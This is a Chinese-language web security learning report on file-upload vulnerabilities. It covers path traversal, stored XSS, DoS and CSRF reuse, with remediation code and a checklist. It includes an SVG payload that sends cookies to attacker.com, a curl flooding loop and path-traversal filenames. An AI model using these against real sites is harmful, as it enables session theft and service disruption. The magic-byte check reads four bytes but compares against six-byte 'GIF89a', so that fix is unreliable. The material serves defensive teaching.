二、漏洞分析与修复

Vulnerability Analysis & Remediation

1

无文件类型限制（任意文件上传）

严重 · CVSS 9.0

CWE-434 · 可上传任意类型文件

Python — 问题代码
file = request.files["file"]
filename = file.filename        # 直接取原始文件名
file.save(os.path.join(UPLOAD_DIR, filename))  # 无任何校验

攻击复现：上传 PHP WebShell shell.php、恶意 HTML steal.html、篡改配置 .htaccess，全部成功！

❌ 修复前无任何文件类型检查
✅ 修复后扩展名白名单 + 魔数校验
2

原始文件名保留（路径穿越）

严重 · CVSS 8.6

CWE-22 · 文件名含 ../ 可覆盖任意文件

正常保存：static/uploads/avatar.jpg
路径穿越：static/uploads/../../app.py → 覆盖项目根目录 app.py！
原始文件名实际写入路径危害
../../app.py项目根目录/app.py覆盖源代码！
../../templates/index.html项目根目录/templates/index.html篡改页面！
../../data/users.db项目根目录/data/users.db覆盖数据库！
❌ 修复前原始文件名直接保存
✅ 修复后UUID 重命名 + 移除路径穿越字符
3

文件覆盖风险

高危

同文件名静默覆盖已有文件，无任何警告。

场景：攻击者上传同名的 avatar.jpg 覆盖其他用户的头像，或多次上传同名的 shell.php 更新 WebShell。

❌ 修复前file.save() 静默覆盖
✅ 修复后UUID 唯一文件名，永不重复
4

存储型 XSS（恶意 HTML/JS 上传）

高危 · CVSS 7.6

CWE-79 · HTML/SVG 文件中的恶意脚本可窃取 Cookie

SVG XSS Payload
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    fetch('http://attacker.com/steal?cookie=' + document.cookie);
  </script>
  <circle cx="50" cy="50" r="40" fill="blue"/>
</svg>

攻击者上传恶意 HTML/SVG 文件 → 将 URL 发给其他用户 → 用户访问时 Cookie 被窃取。

5

无上传频率限制

中危

CWE-770 · 可无限次上传导致 DoS

Bash — DoS 攻击脚本
for i in {1..10000}; do
  curl -b cookies.txt -F "file=@/tmp/large.bin" http://target/upload
done

危害：磁盘空间耗尽、Inode 耗尽、带宽被占用。

❌ 修复前无频率限制
✅ 修复后每用户 60 秒最多 5 次
6

CSRF 绕过与重复提交

中危

CWE-352 · CSRF Token 未在提交后刷新

同一个 CSRF Token 可被反复使用，攻击者获取一个有效 Token 后可在短时间内批量上传大量文件。

❌ 修复前Token 可重复使用
✅ 修复后上传成功后刷新 Token
7

文件大小限制仅依赖服务端配置

低危

缺少前端限制，大文件需等待上传完成才报错

❌ 修复前<input type="file"> 无限制
✅ 修复后accept="image/*" 前端类型+大小提示

四、文件上传漏洞防护方案

Security Hardening

4.1 五层防护体系

文件上传安全防护体系 第一层（核心）：文件类型白名单校验 只允许：.jpg .jpeg .png .gif .webp 禁止：.php .exe .html .js .svg .htaccess 第二层（辅助）：文件内容校验 检查 MIME Content-Type 读取文件头魔数（Magic Bytes） 第三层（关键）：文件名消毒 移除 ../ 路径穿越字符 使用 UUID 重命名 第四层（基础）：存储安全 不存在 Web 可执行目录 设置目录不可执行权限 第五层（业务）：业务层防护 上传频率限制 + 文件大小限制（前端+后端）

4.2 核心修复代码

文件扩展名白名单

Python
ALLOWED_EXTENSIONS = {".jpg", ".jpeg", ".png", ".gif", ".webp"}

def allowed_file(filename):
    if "." not in filename:
        return False
    ext = os.path.splitext(filename)[1].lower()
    return ext in ALLOWED_EXTENSIONS

UUID 文件名消毒

Python
def safe_filename(filename):
    """UUID 重命名，防止路径穿越和重名"""
    ext = os.path.splitext(filename)[1].lower()
    return f"{uuid.uuid4().hex}{ext}"

Magic Bytes 文件头校验

Python
def validate_file_content(file_stream):
    """读取文件头魔数验证文件类型"""
    magic_bytes = {
        b"\xff\xd8\xff": "jpeg",
        b"\x89PNG": "png",
        b"GIF89a": "gif",
        b"RIFF": "webp",
    }
    header = file_stream.read(4)
    file_stream.seek(0)
    for magic in magic_bytes:
        if header.startswith(magic):
            return True, magic_bytes[magic]
    return False, None

白名单 vs 黑名单原则

黑名单（不安全）：禁止 .php、.exe、.jsp... → 总有遗漏，如 .php5、.phtml、.shtml 白名单（安全）：只允许 .jpg、.png、.gif... → 明确可接受的范围，没有遗漏

五、总结与反思

Summary & Reflections

5.1 七种攻击手法

漏洞类型 攻击方式 ──────────────────────────────────────────────────── 任意文件上传 → 上传 WebShell、恶意脚本 路径穿越 → 文件名含 ../ 覆盖关键文件 文件覆盖 → 同名文件静默覆盖 存储型 XSS → 上传 HTML/SVG 窃取 Cookie 无限制上传 → 耗尽磁盘空间（DoS） CSRF + 重复提交 → 批量上传滥用 大小限制不完整 → 带宽消耗

5.2 安全上传的五个必须

  • 必须限制文件扩展名 — 白名单，不是黑名单
  • 必须验证文件内容 — 魔数 + MIME 双重验证
  • 必须消毒文件名 — UUID 重命名，移除路径穿越字符
  • 必须限制上传频率 — 防止 DoS 攻击
  • 必须限制文件大小 — 前端 + 后端双重限制

5.3 Web 安全学习路径

第一阶段：密码安全修复（7个漏洞）→ SQL注入防护 → CSRF防护
第二阶段：文件上传漏洞（7个攻击面）→ 白名单 + 魔数 + UUID + 限速
第三阶段（可继续学习）：XSS → SSRF → SSTI → 反序列化

"永远不要相信用户上传的文件。文件名是假的，扩展名是假的，MIME 头是假的，文件内容也可能是假的。"

文件上传功能是 Web 应用中最容易被忽视的攻击面之一。一个看似简单的头像上传功能，如果不做安全加固，可能成为攻击者控制整个服务器的入口。

5.4 安全检查清单

[ ] 是否使用了白名单机制限制文件扩展名？
[ ] 是否验证了文件内容的 Magic Bytes？
[ ] 是否验证了 MIME Content-Type？
[ ] 是否对文件名进行了消毒处理（移除 ../）？
[ ] 是否使用 UUID 重命名文件？
[ ] 是否限制了文件大小（前端 + 后端）？
[ ] 是否限制了上传频率？
[ ] 上传成功后是否刷新了 CSRF Token？
[ ] 文件是否存储在 Web 根目录之外？
[ ] 错误信息是否没有暴露路径？
[ ] 是否有日志记录上传操作？
